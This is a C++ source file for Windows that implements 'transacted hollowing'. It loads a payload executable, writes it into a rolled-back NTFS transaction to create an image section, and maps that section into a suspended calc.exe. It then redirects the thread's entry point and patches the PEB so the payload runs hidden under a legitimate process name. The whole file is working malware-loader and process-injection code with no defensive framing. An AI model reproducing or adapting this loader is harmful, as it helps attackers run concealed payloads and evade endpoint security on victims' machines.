#include <Windows.h>
#include <stdio.h>
#include "CWLInc.h"
#include <iostream>


BYTE* GetPayloadBuffer(OUT size_t& p_size) {
	HANDLE hFile = CreateFileW(L"C:\\temp\\payload64.exe", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE) {
		perror("[-] Unable to open payload file... \n");
		exit(-1);
	}
	p_size = GetFileSize(hFile, 0);
	BYTE* bufferAddress = (BYTE*)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (bufferAddress == NULL) {
		perror("[-] Failed to allocated memory for payload buffer... \n");
		exit(-1);
	}
	DWORD bytesRead = 0;
	if (!ReadFile(hFile, bufferAddress, p_size, &bytesRead, NULL)) {
		perror("[-] Failed to read payload buffer... \n");
		exit(-1);
	}
	return bufferAddress;
}


HANDLE MakeSectionWithTransaction(BYTE* payload, DWORD payloadSize) {
	HANDLE hTransaction;
	HANDLE hTransactedFile = INVALID_HANDLE_VALUE;
	HANDLE hSection;
	NTSTATUS status;
	DWORD bytesWritten;
	// Function Declaration
	HMODULE hNtdllModule = GetModuleHandleA("ntdll.dll");
	if (hNtdllModule == INVALID_HANDLE_VALUE) {
		perror("[-] Cannot found module ntdll.dll \n");
		exit(-1);
	}
	_NtCreateTransaction pNtCreateTransaction = (_NtCreateTransaction)GetProcAddress(hNtdllModule, "NtCreateTransaction");
	if (pNtCreateTransaction == NULL) {
		perror("[-] Cannot found API NtCreateTransaction \n");
		exit(-1);
	}
	_NtCreateSection pNtCreateSection = (_NtCreateSection)GetProcAddress(hNtdllModule, "NtCreateSection");
	if (pNtCreateSection == NULL) {
		perror("[-] Cannot found API NtCreateSection \n");
		exit(-1);
	}
	_NtRollbackTransaction pNtRollbackTransaction = (_NtRollbackTransaction)GetProcAddress(hNtdllModule, "NtRollbackTransaction");
	if (pNtRollbackTransaction == NULL) {
		perror("[-] Cannot found API NtRollbackTransaction \n");
		exit(-1);
	}

	// Create NTFS Transaction object
	_OBJECT_ATTRIBUTES objAttr;
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
	status = pNtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &objAttr, NULL, NULL, 0, 0, 0, NULL, NULL);
	if (!NT_SUCCESS(status)) {
		perror("[-] Error Creating Transaction Object!!\n");
		exit(-1);
	}
	wprintf(L"[+] NTFS Transaction Object Created\n");

	// open target file for transaction
	wchar_t targetPath[MAX_PATH];
	lstrcpyW(targetPath, L"C:\\temp\\mynotes.txt");
	hTransactedFile = CreateFileTransactedW(targetPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, 
								OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL, hTransaction, NULL, NULL);
	if (hTransactedFile == INVALID_HANDLE_VALUE) {
		perror("[-] Error Opening Target File For Transaction..\n");
		exit(-1);
	}

	// Write payload to transacted file
	if (!WriteFile(hTransactedFile, payload, payloadSize, &bytesWritten, NULL)) {
		perror("[-] Error writing payload into transaction!!\n");
		exit(-1);
	}
	wprintf(L"[+] Payload Written To The Transacted File \n");

	// Create Section from transacted file
	status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTransactedFile);
	if (!NT_SUCCESS(status)) {
		perror("[-] Failed To Create Section From Transacted File..\n");
		exit(-1);
	}
	wprintf(L"[+] Section Created From Transaction \n");
	CloseHandle(hTransactedFile);
	hTransactedFile = INVALID_HANDLE_VALUE;

	// Rollback the transaction 
	status = pNtRollbackTransaction(hTransaction, TRUE);
	if (!NT_SUCCESS(status)) {
		perror("[-] Failed To Rollback Transaction");
		exit(-1);
	}
	wprintf(L"[+] Transaction Rolled back..\n");
	CloseHandle(hTransaction);
	hTransaction = INVALID_HANDLE_VALUE;
	return hSection;
}

HANDLE CreateSuspendedProcess(PROCESS_INFORMATION &pi) {
	LPSTARTUPINFO sInfo = new STARTUPINFO();
	sInfo->cb = sizeof(STARTUPINFOW);
	HANDLE hTargetProcess = INVALID_HANDLE_VALUE;
	wchar_t exePath[MAX_PATH];
	lstrcpyW(exePath, L"C:\\Windows\\System32\\calc.exe");
	// Create Process In Suspended Mode
	if (!CreateProcessW(NULL, exePath, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, sInfo, &pi)) {
		perror("[-] Failed To Create Suspended Process.. \n");
		exit(-1);
	}
	wprintf(L"[+] Created Process In Suspended Mode...\n");
	hTargetProcess = pi.hProcess;
	return hTargetProcess;

}


PVOID MapSectionIntoProcessVA(HANDLE hProcess, HANDLE hSection)
{
	NTSTATUS status = STATUS_SUCCESS;
	SIZE_T viewSize = 0;
	PVOID sectionBaseAddress = 0;
	_NtMapViewOfSection pNtMapViewOfSection = (_NtMapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtMapViewOfSection");
	if (pNtMapViewOfSection == NULL) {
		perror("[-] Cannot found API NtMapViewOfSection \n");
		exit(-1);
	}
	// Map the section into target process virtual address space
	status = pNtMapViewOfSection(hSection, hProcess, &sectionBaseAddress, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_READONLY);
	if (!NT_SUCCESS(status)) {
		perror("[-] Unable To Map Section Into The Target Process \n");
		exit(-1);
	}
	wprintf(L"[+] Successfully Mapped Section To The Target Process\n");
	wprintf(L"[+] Mapped Base: %p \n", sectionBaseAddress);
	return sectionBaseAddress;
}

ULONG_PTR GetPayloadEntryPoint(HANDLE hProcess, PVOID sectionBaseAddress, BYTE* payloadBuffer, PROCESS_BASIC_INFORMATION pbi) {
	NTSTATUS status;
	ULONGLONG entryPoint;

	_RtlImageNTHeader pRtlImageNTHeader = (_RtlImageNTHeader)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlImageNtHeader");
	if (pRtlImageNTHeader == NULL) {
		perror("[-] Error RtlImageNTHeader API not found\n");
		exit(-1);
	}
	wprintf(L"[+] Base Address of payload in target process: %p \n", sectionBaseAddress);
	entryPoint = (pRtlImageNTHeader(payloadBuffer))->OptionalHeader.AddressOfEntryPoint;
	wprintf(L"[+] Image Base Address of the payload buffer in remote process: %p \n", entryPoint);
	entryPoint += (ULONGLONG)sectionBaseAddress;
	wprintf(L"[+] EntryPoint of the payload buffer: %p \n", entryPoint);
	return entryPoint;
}

BOOL TransactHollowing(BYTE* payload, DWORD payloadSize) {
	HANDLE hSection = INVALID_HANDLE_VALUE;
	HANDLE hTargetProcess = INVALID_HANDLE_VALUE;
	PROCESS_BASIC_INFORMATION pbi;
	NTSTATUS status;
	DWORD returnLength = 0;
	ULONGLONG entryPoint;
	PEB* remotePEB;
	
	// Make Section With Transacted File
	hSection = MakeSectionWithTransaction(payload, payloadSize);

	_NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	if (pNtQueryInformationProcess == NULL) {
		perror("[-] Error NtQueryInformationProcess API not found\n");
		exit(-1);
	}
	// Creating Process In Suspended Mode
	PROCESS_INFORMATION pInfo = { 0 };
	hTargetProcess = CreateSuspendedProcess(pInfo);
	if (hTargetProcess == INVALID_HANDLE_VALUE) {
		perror("[-] Unable to create Suspended Process\n");
		exit(-1);
	}

	// Maping the section into the target process
	PVOID sectionBaseAddress = MapSectionIntoProcessVA(hTargetProcess, hSection);

	// Query Remote Process Information
	status = pNtQueryInformationProcess(hTargetProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	if (!NT_SUCCESS(status)) {
		perror("[-] Error Getting Target Process Information\n");
		exit(-1);
	}
	// Getting Payload EntryPoint
	entryPoint = GetPayloadEntryPoint(hTargetProcess, sectionBaseAddress, payload, pbi);

	// changing the control flow by resetting the entrypoint
	LPCONTEXT context = new CONTEXT();
	context->ContextFlags = CONTEXT_INTEGER;
	if (!GetThreadContext(pInfo.hThread, context)) {
		perror("[-] Unable to Get Thread Context\n");
		exit(-1);
	}
	// changing entry point to payload entrypoint
	context->Rcx = entryPoint;

	if (!SetThreadContext(pInfo.hThread, context)) {
		perror("[-] Unable to Set Thread Context\n");
		exit(-1);
	}

	// Get Remote PEB address
	remotePEB = (PEB*)pbi.PebBaseAddress;
	wprintf(L"[+] Remote PEB address: %p \n", remotePEB);
	ULONGLONG imageBaseOffset = sizeof(ULONGLONG) * 2;
	LPVOID remoteImageBase = (LPVOID)((ULONGLONG)remotePEB + imageBaseOffset);
	wprintf(L"[+] Address Offset at PEB pointing ImageBaseAddress: %p \n", remoteImageBase);
	SIZE_T written = 0;
	//Write the payload's ImageBase into remote process' PEB:
	if (!WriteProcessMemory(pInfo.hProcess, remoteImageBase,
			&sectionBaseAddress, sizeof(ULONGLONG),
			&written)) {
		perror("[-] Unable to Update ImageBase into remote process\n");
		exit(-1);
	}
	wprintf(L"[+] Updated ImageBaseAddress with payload ImageBaseAddress at PEB offset: %p \n", remoteImageBase);

	// Resuming the thread
	ResumeThread(pInfo.hThread);
	wprintf(L"[+] Thread Resumed \n");
	return TRUE;
}

int main() {
	size_t payloadSize = 0;
	BYTE* payloadBuffer = GetPayloadBuffer(payloadSize);
	BOOL isSuccess = TransactHollowing(payloadBuffer, (DWORD)payloadSize);
	system("pause");

}